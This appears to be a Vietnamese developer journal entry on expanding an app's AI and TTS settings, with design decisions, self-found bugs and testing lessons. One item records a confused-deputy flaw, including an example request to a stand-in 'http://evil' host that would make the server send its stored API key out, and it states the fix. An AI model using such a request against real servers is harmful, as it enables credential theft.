# 2026-07-27 — AI + TTS Settings mở rộng

**Commit:** `3eb63d0` | **Plan:** `plans/260727-2055-ai-tts-settings-expansion/` | **Review:** `plans/reports/from-code-reviewer-to-cook-260727-ai-tts-settings-expansion-review.md`

## Bối cảnh

Settings dialog (plan `260718-2041`) đổi được provider/model nhưng key vẫn phải khai trong `.env.local` **và restart** — ENV không hot-reload, khác `.settings.json` hiệu lực ngay. Dialog mất nửa ý nghĩa. Cộng thêm: `lib/settings.ts` cố tình bỏ qua `SCRIPT_BASE_URL`/`SCRIPT_API_KEY`, nên dùng UI là *mất* khả năng ENV từng có (Vision ≠ Biên kịch). TTS thì nằm ngoài, voice ID ElevenLabs gõ tay.

Chạy theo mode TDD: mỗi phase viết/sửa test trước, chạy thấy đỏ, rồi mới code. Test neo là `verify-settings.mts` (151 dòng, 6 case) — mở rộng chứ không viết mới.

## Quyết định & lý do

- **`script: null` thay cờ `shareWithVision`** — precedence hiển nhiên, không sinh được state mâu thuẫn.
- **GET xoá hẳn trường `apiKey`** (thay bằng `hasKey` + `keyMask`) thay vì mask tại chỗ: lỡ sót một nhánh DTO nào cũng không còn gì để rò. Test assert trên **toàn chuỗi JSON** response, không từng field.
- **`lib/ai-probe.ts` tách khỏi route** — không phải để gọn, mà vì route **PIN `baseURL` theo preset** nên không chĩa được vào mock server. Hàm ở lib nhận `baseURL` đã resolve → test được đủ nhánh parse.
- **Pin `baseURL` là chuyện bảo mật, không chỉ chuẩn hoá** — route *gửi API key của người dùng* tới `baseURL` đó.
- **`listVoices` thành method của `TtsProvider`** thay vì `if (provider === 'elevenlabs')` trong route.
- **Đường lùi native của Google suy từ `baseURL`** (`…/v1beta/openai` → `…/v1beta/models?key=`) thay vì hằng số cứng — vừa test được bằng mock, vừa đúng khi trỏ proxy riêng. Nhờ đó bỏ luôn được gate "Bước 0 cần key thật" mà không đoán mò.

## Vấp phải

1. **Plan tự mâu thuẫn ở 2 chỗ, test bắt được cả hai.**
   - phase-02 bảo migration `scriptModel` rỗng → `script: null`, nhưng phase-03 lại bảo `script === null` thì model rơi về `SCRIPT_MODEL`. Hai điều loại trừ nhau: ở v1 rỗng nghĩa là *rơi về `SCRIPT_MODEL`*, còn `null` ở v2 nghĩa là *dùng y model của vision*. Migrate về null sẽ đổi model biên kịch của file v1 đang chạy — đúng thứ AC6 cấm.
   - phase-05 viết công thức `readTtsConfig` mà chính test #5 của nó không thể pass (settings CapCut + override ElevenLabs sẽ gửi giọng `BV562` cho ElevenLabs).
   Cả hai đều sửa **spec**, không phải code. Reviewer xác nhận độc lập.

2. **Sửa một quyết định của mình theo hướng SAI, và nó là lỗ hổng nghiêm trọng nhất đợt này.** Cho `script` thừa kế key của `vision` khi bỏ tick "dùng chung" — ý định đúng (không làm gãy cấu hình đang chạy), nhưng thiếu vế "provider trùng". Hệ quả: đổi provider mà không gõ lại ô key ⇒ **key z.ai được lưu dưới nhãn Google rồi gửi thẳng sang đó**, và vì `cfg.apiKey` khác rỗng nên `resolveApiKey` không bao giờ rơi về `GEMINI_API_KEY`. Đây **chính là AC2** — nó sẽ fail đúng lúc cắm key thật vào.
   Bất biến đúng ("key thuộc về cặp (provider, key)") đã được nhận ra ở đường *probe* (`resolveProbeApiKey` có sẵn guard) nhưng không áp cho đường *ghi*. Dấu hiệu điển hình của code sinh theo từng phase.

3. **`provider: 'custom'` biến route probe thành công cụ rút `OPENAI_API_KEY`.** `custom` (đúng thiết kế) nhận `baseURL` từ body, nhưng `resolveProbeApiKey` không có key draft thì rơi xuống ENV. Một trang web bất kỳ đang mở cùng trình duyệt POST `{provider:'custom', baseURL:'http://evil'}` là server tự đính key vào rồi gửi đi — họ không cần đọc response (CORS chặn response, không chặn request). Với `content-type: text/plain` thì còn là *simple request*, không có preflight.
   Confused deputy, không phải vấn đề thiếu auth. Chặn 2 lớp: bỏ fallback ENV cho `custom` + `sec-fetch-site: cross-site` → 403.

4. **Tự gây hồi quy nhánh ENV thuần.** Suy provider bằng `baseURL.includes('api.z.ai')` để chọn dạng param tắt-thinking → endpoint GLM ở host khác (`open.bigmodel.cn`, proxy nội bộ) mất param im lặng, mất ~50% token tiết kiệm, không lỗi. Bài học: "backward-compat tuyệt đối" nghĩa là **không suy diễn gì thêm**, kể cả suy diễn có vẻ thông minh hơn.

5. **Test gọi API thật mà vẫn "pass".** `verify-tts-settings` case 13 dùng provider `capcut` không đặt `CAPCUT_BASE_URL` → `test:unit` ping API nội bộ không chính thức mỗi lần chạy, mà assertion chỉ là "response không chứa key" nên lỗi mạng cũng xanh. Phantom test.

## Phát hiện đáng giữ

- **Route handler của Next 16 import thẳng vào script `.mts` chạy bằng tsx được** — `import { GET } from '@/app/api/settings/route'` rồi gọi với `Request` thuần, không cần dựng server. Điều kiện: file phải là `.mts` (top-level await không chạy dưới output `cjs`) và dùng alias `@/`. Mở ra cách test route rẻ hơn e2e nhiều.
- **`export { X } from './y'` KHÔNG tạo binding cục bộ** — re-export xong mà trong file vẫn tham chiếu `X` thì gãy runtime. Phải `import` riêng.
- **Mỗi test dựng mock server trên port 0 (OS tự chọn)** → cache in-memory khoá theo `provider+baseURL` tự nhiên không lẫn giữa các case, khỏi cần API `clearCache()` chỉ-để-test trong code production.
- **`e2e-script-video.mts` chỉ là nửa client** — cần 3 mock (`:3106/:3107/:3108`) + `next start :3105` chạy sẵn với env riêng. Chạy trần `pnpm test:e2e-video` luôn ra ECONNREFUSED, không phải lỗi code.
- Assert "module là data thuần" bằng cách **đọc chính source rồi grep** (`from 'node:`, `process.env`, `import` không có `type`) — rẻ, và ràng buộc không trôi về sau. Nhớ strip comment trước khi grep, nếu không comment nói *về* `process.env` cũng bị bắt.
- `verify-settings.mts` mất 6 assertion vì `Partial<StageConfig> & { apiKey?: string|null }` cho ra `apiKey?: string` (giao của `string` và `string|null`). Phải `Omit<Partial<T>,'apiKey'> & {...}`.

## Còn mở

- **AC1 + AC2 chưa nghiệm thu** — thiếu `GEMINI_API_KEY`/`ZAI_API_KEY`. Phần logic của AC2 đã có test khoá (mục 14 + mục 20 `verify-settings.mts`), còn thiếu đúng lần chạy thật.
- **AC5 chỉ nghiệm thu nhánh CapCut** (user chốt không có key ElevenLabs). Nhánh ElevenLabs chỉ phủ bằng mock.
- `/api/settings/test` vẫn echo 200 ký tự thông điệp upstream — chính là thứ làm nút "Kiểm tra" hữu ích, nhưng về lý thuyết cũng là cách đọc service chạy trên localhost. Chờ user quyết.
- 3 mục trong `docs/known-gaps.md`: skill Python chưa ăn theo settings mới; file v1 tự nhận `max_tokens:16384` + `reasoning.exclude` mà không ai bấm gì; đổi giọng giữa chừng một job → video trộn 2 giọng.
